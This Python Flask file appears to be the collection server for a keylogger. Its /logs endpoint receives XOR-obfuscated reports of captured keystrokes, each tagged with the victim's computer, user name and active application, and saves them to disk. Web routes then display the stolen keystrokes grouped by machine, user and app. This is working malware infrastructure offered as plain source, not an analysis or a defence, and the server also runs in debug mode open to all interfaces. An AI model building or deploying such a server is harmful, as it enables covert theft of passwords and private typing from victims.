import json
from flask import Flask, render_template, jsonify, request

app = Flask(__name__, template_folder='templates', static_folder='static')

with open('server/static/json/fake_data.json', 'r+') as file:
    json_data = json.load(file)

def decrypt_data(data: bytes, key='KopLeoRos') -> bytes:
    key: bytes = key.encode()
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

@app.route('/')
def index():
    computers_summary = {}

    for computer, users in json_data.items():
        app_count = len(set(app for user in users.values() for app in user))
        key_count = sum(len(keys) for user in users.values() for app in user.values() for keys in app.values())

        # Store app and key counts per user
        user_data = {
            user: {
                "app_count": len(user_apps),
                "key_count": sum(len(keys) for app in user_apps.values() for keys in app.values())
            }
            for user, user_apps in users.items()
        }

        computers_summary[computer] = {
            "app_count": app_count,
            "key_count": key_count,
            "users": list(users.keys()),  # Keep list for easy access
            "user_data": user_data  # Include app and key counts per user
        }

    return render_template("index.html", computers=computers_summary)

@app.route('/computer/<computer_name>/user/<user_name>')
def user_logs(computer_name, user_name):
    if computer_name not in json_data or user_name not in json_data[computer_name]:
        return {"error": "User or computer not found"}, 404

    user_data = json_data[computer_name][user_name]
    
    formatted_data = {}
    for app, timestamps in user_data.items():
        formatted_data[app] = {
            "total_keys": sum(len(keys) for keys in timestamps.values()),
            "logs": timestamps
        }

    return formatted_data

@app.route('/computer/<computer_name>')
def computer_logs(computer_name):
    if computer_name not in json_data:
        return jsonify({"error": "Computer not found"}), 404
    
    computer_data = json_data[computer_name]
    details = {}
    
    for user, apps in computer_data.items():
        for app, timestamps in apps.items():
            details[app] = {"total_keys": sum(len(keys) for keys in timestamps.values()), "logs": timestamps}
    
    return jsonify(details)

@app.route('/logs', methods=['POST'])
def logs():
    if request.method == 'POST':
        data: str = decrypt_data(request.data).decode()
        data_dict: dict = json.loads(data)
        print(data_dict)

        computer_name = data_dict['computer_name']
        user_name = data_dict['user_name']
        active_app = data_dict['active_app']
        keys = data_dict['keys']
        timestamp = data_dict['timestamp']
        
        json_data.setdefault(computer_name, {}) \
                 .setdefault(user_name, {}) \
                 .setdefault(active_app, {})[timestamp] = keys

        with open('server/static/json/data.json', 'w') as file:
            json.dump(json_data, file, indent=4)

        return data

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5556, debug=True)
